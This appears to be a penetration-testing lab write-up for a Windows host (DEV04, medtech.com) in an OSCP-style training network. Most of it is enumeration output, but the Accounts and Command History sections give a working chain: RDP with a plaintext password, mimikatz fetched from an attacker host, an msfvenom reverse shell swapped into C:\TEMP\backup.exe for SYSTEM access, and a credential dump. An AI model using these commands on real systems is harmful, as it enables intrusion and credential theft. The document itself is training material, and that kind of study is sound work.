# 172.16.X.12
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`

- C:\Users\yoshi\Desktop\local.txt
- C:\Users\Administrator\Desktop\proof.txt
# Accounts
### SYSTEM
- replace C:\TEMP\backup.exe with reverse shell (in OSCP folder backup.exe)
- listen nc -lvnp 4444
- connect
### yoshi / Mushroom!
`xfreerdp3 /u:yoshi /p:Mushroom! /v:172.16.152.12`
`whoami /priv`
```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
`whoami /groups`
```
Group Name                                 Type             SID          Attributes                                     
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192 
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.97 --top-ports 1000`
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
`sudo nmap -A -T4 -p- 172.16.213.10`
```

```
`nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption 172.16.213.12`
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: MEDTECH
|   NetBIOS_Domain_Name: MEDTECH
|   NetBIOS_Computer_Name: DEV04
|   DNS_Domain_Name: medtech.com
|   DNS_Computer_Name: DEV04.medtech.com
|   DNS_Tree_Name: medtech.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-28T21:11:48+00:00
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
```
## Local Users
`Get-LocalUser`
```
Name               Enabled Description
----               ------- -----------
Administrator      True    Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...

```
## Local Groups
`Get-LocalGroup`
```
Name                                Description
----                                -----------
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the...
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Device Owners                       Members of this group can change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for...
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteA...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers runn...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual de...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
Replicator                          Supports file replication in a domain
Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of S...
System Managed Accounts Group       Members of this group are managed by the system.
Users                               Users are prevented from making accidental or intentional system-wide changes an...

```
## System Info
`systeminfo`
```
Host Name:                 DEV04
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-10000-00001-AA573
Original Install Date:     9/28/2022, 11:17:11 AM
System Boot Time:          7/23/2024, 9:37:40 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,408 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,265 MB
Virtual Memory: In Use:    1,534 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    medtech.com
Logon Server:              \\DC01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB5004330
                           [02]: KB5005039
                           [03]: KB5005552
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.152.12
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
## Routes
`route print`
```
===========================================================================
Interface List
  2...00 50 56 86 eb 27 ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0   172.16.152.254    172.16.152.12     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.152.0    255.255.255.0         On-link     172.16.152.12    271
    172.16.152.12  255.255.255.255         On-link     172.16.152.12    271
   172.16.152.255  255.255.255.255         On-link     172.16.152.12    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     172.16.152.12    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     172.16.152.12    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0   172.16.152.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```
## Netstat
`netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       376
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1632
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2776
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       2000
  TCP    172.16.152.12:139      0.0.0.0:0              LISTENING       4
  TCP    172.16.152.12:3389     172.16.152.254:58437   ESTABLISHED     376
  TCP    172.16.152.12:60081    172.16.152.10:135      TIME_WAIT       0
  TCP    172.16.152.12:60082    172.16.152.10:49668    TIME_WAIT       0
  TCP    172.16.152.12:60083    172.16.152.10:135      TIME_WAIT       0
  TCP    172.16.152.12:60084    172.16.152.10:49668    TIME_WAIT       0
  TCP    [::]:135               [::]:0                 LISTENING       900
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       376
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       672
  TCP    [::]:49665             [::]:0                 LISTENING       520
  TCP    [::]:49666             [::]:0                 LISTENING       1096
  TCP    [::]:49667             [::]:0                 LISTENING       1632
  TCP    [::]:49668             [::]:0                 LISTENING       672
  TCP    [::]:49669             [::]:0                 LISTENING       2776
  TCP    [::]:49670             [::]:0                 LISTENING       652
  TCP    [::]:49671             [::]:0                 LISTENING       2000
  UDP    0.0.0.0:123            *:*                                    1060
  UDP    0.0.0.0:162            *:*                                    2240
  UDP    0.0.0.0:500            *:*                                    1988
  UDP    0.0.0.0:3389           *:*                                    376
  UDP    0.0.0.0:4500           *:*                                    1988
  UDP    0.0.0.0:5353           *:*                                    1200
  UDP    0.0.0.0:5355           *:*                                    1200
  UDP    0.0.0.0:53886          *:*                                    1200
  UDP    127.0.0.1:56638        127.0.0.1:56638                        672
  UDP    127.0.0.1:57237        127.0.0.1:57237                        1384
  UDP    127.0.0.1:57300        127.0.0.1:57300                        2068
  UDP    172.16.152.12:137      *:*                                    4
  UDP    172.16.152.12:138      *:*                                    4
  UDP    [::]:123               *:*                                    1060
  UDP    [::]:162               *:*                                    2240
  UDP    [::]:500               *:*                                    1988
  UDP    [::]:3389              *:*                                    376
  UDP    [::]:4500              *:*                                    1988
  UDP    [::]:53886             *:*                                    1200
```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\yoshi\AppData\Roaming
CLIENTNAME                     kali
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   DEV04
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
FPS_BROWSER_APP_PROFILE_STRING Internet Explorer
FPS_BROWSER_USER_PROFILE_ST... Default
HOMEDRIVE                      C:
HOMEPATH                       \Users\yoshi
LOCALAPPDATA                   C:\Users\yoshi\AppData\Local
LOGONSERVER                    \\DC01
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             0102
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\yoshi\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell...
PUBLIC                         C:\Users\Public
SESSIONNAME                    RDP-Tcp#0
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\yoshi\AppData\Local\Temp\2
TMP                            C:\Users\yoshi\AppData\Local\Temp\2
USERDNSDOMAIN                  MEDTECH.COM
USERDOMAIN                     MEDTECH
USERDOMAIN_ROAMINGPROFILE      MEDTECH
USERNAME                       yoshi
USERPROFILE                    C:\Users\yoshi
windir                         C:\Windows

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```
           DC: \\DC01
      Address: \\172.16.152.10
     Dom Guid: 29ae137a-f795-4fd5-a839-607b5807b1d7
     Dom Name: MEDTECH
  Forest Name: medtech.com
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```

# Command History
```c
    wget 192.168.45.219:80/mimikatz.exe -Outfile mimikatz.exe

    net user /domain
    // Administrator            Guest                    joe
    // krbtgt                   leon                     mario
    // offsec                   peach                    wario
    // yoshi
    net group /domain
    // Group Accounts for \\DC01.medtech.com

    // -------------------------------------------------------------------------------
    // *Cloneable Domain Controllers
    // *DnsUpdateProxy
    // *Domain Admins
    // *Domain Computers
    // *Domain Controllers
    // *Domain Guests
    // *Domain Users
    // *Enterprise Admins
    // *Enterprise Key Admins
    // *Enterprise Read-only Domain Controllers
    // *Group Policy Creator Owners
    // *Key Admins
    // *Protected Users
    // *Read-only Domain Controllers
    // *Schema Admins

    // found C:\TEMP\backup.exe
    // no idea what runs this or when but discord said get a reverse shell with it
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o backup.exe
    // start listender
    nc -lvnp 4444
    Invoke-WebRequest -Uri http://192.168.45.129/backup.exe -OutFile C:\TEMP\backup.exe
    //got reverse shell as system
    run mimikatz
    privilege::debug
    token::elevate
    sekurlsa::logonpasswords

```
